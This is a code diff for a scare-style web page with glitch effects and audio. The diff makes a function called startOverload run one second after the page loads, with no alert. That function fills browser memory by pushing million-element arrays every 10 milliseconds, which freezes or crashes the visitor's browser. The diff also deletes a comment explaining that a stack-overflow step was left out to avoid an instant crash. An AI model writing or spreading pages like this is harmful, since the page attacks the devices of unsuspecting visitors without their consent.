@@ -69,6 +69,12 @@
       margin-top: 30px;
     }
 
+    #overloadStatus {
+      margin-top: 20px;
+      font-size: 1.5em;
+      color: red;
+    }
+
     @keyframes glitch {
       0% { transform: translate(0); }
       25% { transform: translate(-2px, 2px); }
@@ -81,12 +87,6 @@
       0% { opacity: 1; }
       50% { opacity: 0.5; }
       100% { opacity: 1; }
-    }
-
-    #overloadStatus {
-      margin-top: 20px;
-      font-size: 1.5em;
-      color: red;
     }
   </style>
 </head>
@@ -118,10 +118,11 @@
       if (audio.paused) audio.play();
     });
 
-  
-        startOverload();
-      }
-    }, 5000);
+    // Start overload after 5 seconds immediately (no alert)
+    setTimeout(() => {
+      document.getElementById('warning').style.display = 'block';
+      startOverload();
+    }, 1000);
 
     function startOverload() {
       const status = document.getElementById('overloadStatus');
@@ -161,8 +162,6 @@
       setInterval(() => {
         arr.push(new Array(1e6).fill('*'));
       }, 10);
-
-      // Note: Recursive stack overflow intentionally omitted to avoid instant crash.
     }
   </script>
 </body>
